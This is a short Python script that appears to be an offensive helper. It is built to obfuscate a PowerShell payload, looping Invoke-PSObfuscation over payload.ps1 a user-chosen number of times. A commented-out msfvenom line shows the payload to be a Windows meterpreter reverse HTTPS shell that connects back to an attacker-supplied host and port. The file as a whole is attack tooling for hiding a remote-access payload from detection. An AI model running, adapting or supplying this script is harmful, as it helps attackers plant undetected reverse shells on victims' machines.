from sys import argv as av
from os import system as shell
import subprocess
import time



#shell("msfvenom -p windows/meterpreter/reverse_https -f powershell lhost="+av[1]+" lport="+av[2]+" -o payload.ps1 ")
p = subprocess.Popen("pwsh", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True)
time.sleep(2)
p.stdin.write(". /opt/Invoke-PSObfuscation/Invoke-PSObfuscation.ps1")

for i in range(0, int(av[3])):
    time.sleep(2)
    p.stdin.write("Invoke-PSObfuscation -All -Path payload.ps1 -Outfile payload.ps1")
    print(str(i) + " iterations...")

shell("cat payload.ps1")
